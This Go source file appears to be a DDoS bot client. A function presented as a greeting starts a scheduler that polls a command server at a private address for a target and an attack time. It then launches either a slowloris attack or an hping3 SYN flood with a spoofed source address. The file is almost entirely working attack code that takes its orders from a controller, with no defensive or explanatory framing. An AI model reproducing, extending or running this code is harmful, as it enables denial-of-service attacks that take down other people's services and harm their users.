package ddos

import (
	"encoding/json"
	"fmt"
	"log"
	"math/rand"
	"net/http"
	"os/exec"
	"strings"
	"sync"
	"time"

	"github.com/jasonlvhit/gocron"
)

type AttackInfo struct {
	Ip     string
	Port   string
	Date   string
	DateNs int64
}

// Hello returns a greeting for the named person.
func Hello(wg *sync.WaitGroup, name string) {
	// Return a greeting that embeds the name in a message.
	message := fmt.Sprintf("Hi, %v. Welcome!", name)
	fmt.Println(message)
	cronCheckDDoS()
	wg.Done()
}

func cronCheckDDoS() {
	scheduler := gocron.NewScheduler()

	// Begin job immediately upon start
	scheduler.Every(5).Second().From(gocron.NextTick()).Do(checkDDoS)
	//scheduler.Every(1).Day().From(gocron.NextTick()).Do(checkDDoS)

	// Start all the pending jobs
	<-scheduler.Start()
}

func checkDDoS() {
	attackInfo := new(AttackInfo)
	err := getAttackInfo("http://10.0.2.9", attackInfo)
	if err != nil {
		fmt.Println(err)
	} else {
		fmt.Println(attackInfo)
		cronAttackDDoS(attackInfo.Ip, attackInfo.Date, attackInfo.DateNs)
	}
}

func cronAttackDDoS(ip string, date string, dateNs int64) {
	scheduler := gocron.NewScheduler()

	// Begin job at a specific date/time
	t := time.Unix(0, dateNs)
	scheduler.Every(1).Second().From(&t).Do(attackDDoS, ip)

	fmt.Println(ip + " attack scheduled")

	<-scheduler.Start()
}

func attackDDoS(ip string) {
	x := randomNumber()
	fmt.Println(x)

	switch x {
	case 1:
		fmt.Println("------------------------Starting Slowloris Attack------------------------")
		out, err := exec.Command("./slowloris", ip).Output()
		if err != nil {
			log.Fatal(err)
		}
		fmt.Println(string(out))
	case 2:
		fmt.Println("------------------------Starting TCP SYN Attack------------------------")
		out, err := exec.Command("hping3", "--syn", strings.Split(ip, ":")[0], "-p", "9999", "--flood", "--spoof", "10.0.0.1").Output()
		if err != nil {
			log.Fatal(err)
		}
		fmt.Println(string(out))
	}
}

func randomNumber() int {
	rand.Seed(time.Now().UnixNano())
	min := 1
	max := 2
	return rand.Intn(max-min+1) + min
}

func getAttackInfo(url string, target interface{}) error {
	resp, err := http.Get(url)
	if err != nil {
		return err
	}

	defer resp.Body.Close()
	return json.NewDecoder(resp.Body).Decode(target)
}
